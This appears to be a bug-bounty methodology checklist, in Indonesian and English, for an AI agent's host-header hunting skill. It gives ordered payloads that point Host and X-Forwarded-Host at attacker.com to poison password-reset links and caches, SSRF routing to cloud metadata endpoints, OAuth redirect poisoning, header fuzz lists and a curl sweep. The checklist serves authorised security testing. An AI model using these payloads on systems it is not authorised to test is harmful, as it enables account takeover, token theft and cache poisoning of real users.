# Host Header Injection Battery — ordered, run top-to-bottom

Katalog eksekusi cepat untuk `hunt-host-header`. SKILL.md sudah punya 5 phase + worked case;
di sini condensation jadi battery berjenjang + kill-signal + fingerprint. Additive-only.

**Prinsip (dari SKILL.md):** reflection host di Location/body HANYA berarti kalau URL yang di-generate
**BERUBAH** vs baseline (header dihilangkan). Selalu capture baseline dulu.

---

## Tier 0 — Host-trust triage (fastest proof, no inbox needed)

| # | Cek | Signal | Hasil |
|---|---|---|---|
| 0a | Redirect endpoint: inject host → Location header | URL berubah ke attacker host | host di-trust di redirect |
| 0b | Body absolute-URL rewrite (`<form action>`, `<link canonical>`, `og:url`, `<base href>`, `src`) | URL jadi host penyerang | host di-trust di render |
| 0c | Baseline diff | inject vs tanpa-header | beda = refleksi nyata, bukan default |

**Kill-signal:** Location/body URL berubah mengikuti host penyerang → lanjut Tier 1 (reset poisoning).

---

## Tier 1 — Password Reset Poisoning (ATO paling sering bayar)

Urutan header, cheapest-first:
```
1a. Host: attacker.com                    (override langsung)
1b. X-Forwarded-Host: attacker.com        (dibelakang reverse proxy)
1c. Host + X-Forwarded-Host combo, X-Host
1d. Dual-Host:  Host: target.com\r\nHost: attacker.com   (stack baca Host KEDUA)
1e. Absolute-URL inject: Host: target.com.attacker.com   (link jadi TARGET.evil.com)
1f. Trailing-port/userinfo:  Host: target.com:80@attacker.com   (parser split : atau @)
```

**Confirm = OOB, bukan response:** reset mailer harus benar-benar kirim link ke host penyerang
(point ke Collaborator / domain unik), lalu BACA email-nya. Jangan infer dari header yang di-reflect —
banyak app menaruh attacker.com di email tapi link domain di-pin server.

**Kill-signal:** token reset B mendarat di host penyerang → **ATO Critical**, stop.

---

## Tier 2 — Web Cache Poisoning via Host / X-Forwarded-Host

```
2a. Host reflected ke body? (cari di <script src>, canonical, og:url)
2b. Response cacheable? cache key?  →  X-Cache/CF-Cache-Status: HIT, Age>0, Via: varnish/fastly/cloudfront
    Vary: tidak include X-Forwarded-Host = header UNKEYED → poisonable
2c. Prove: poison sekali, lalu fetch CLEAN (tanpa header injected) di key yang sama → masih serve payload
```

**Kill-signal:** poison bertahan di cache tanpa header injected → stored XSS/redirect di-scale.

---

## Tier 3 — SSRF via Host Header (DUA mekanisme, jangan dicampur)

**Mekanisme A — routing SSRF (path di request line, Host mengarahkan proxy upstream):**
```
GET / HTTP/1.1
Host: internal.host      (proxy route upstream berdasarkan Host)
```
- GCP `metadata.google.internal`, Azure `169.254.169.254`, AWS `169.254.169.254` — routing via Host.
- Internal hostname/port: `Host: internal-svc:8080`.

**Mekanisme B — path-routing bypass (reach internal path yang edge blokir):**
```
GET /admin HTTP/1.1
Host: real.target.com      (Host asli, path internal)
```
- Diff vs direct `GET /admin` (yang diblokir edge) — status/body beda = prove.

**Blind:** Host ke Collaborator subdomain → proxy outbound DNS/HTTP → callback = front-end resolve host penyerang.

**Kill-signal:** metadata/token internal terbaca, atau callback outbound → SSRF.

---

## Tier 4 — OAuth / OIDC / SAML poisoning

- Authorization endpoint bangun `redirect_uri` / display URL dari Host? → re-point flow.
- OIDC discovery: `issuer`/endpoints reflect Host → seluruh flow bisa di-repoint.

**Kill-signal:** OAuth code/token victim bocor ke host penyerang.

---

## Tier 5 — Header fuzzing (Param Miner / fuzz semua header host-family)

`X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-Original-Host`, `X-Forwarded-For`,
`Forwarded`, `X-HTTP-Host-Override`, `X-Custom-IP-Authorization`, `X-Rewrite-URL`,
`X-Original-URL`, `X-Rewrite-URL`.

**Detect:** setiap header yang mengubah Location/body/cache/routing = host-trust surface.

---

## Fingerprint quick-ref (sweep cepat per target)

1. `curl -sI https://<T> -H "Host: <collab>"` → cek Location/body change.
2. Baseline tanpa header → diff.
3. Cek cacheability (`X-Cache`, `Age`, `Vary`).
4. Reset flow: inject tiap header (6 shape Tier 1) + baca email.
5. Fuzz header-family (Tier 5).

## Refusal-pattern

- Host reflected tapi URL TIDAK berubah vs baseline → bukan temuan.
- Link berisi attacker.com tapi domain di-pin server → bukan temuan (baca email, jangan infer).
- Reflection tanpa dampak (reset/cache/SSRF/OAuth) → Low/Info, jangan High.
- SSRF "routing" vs "path-bypass" jangan dicampur — dua bug beda, bukti beda.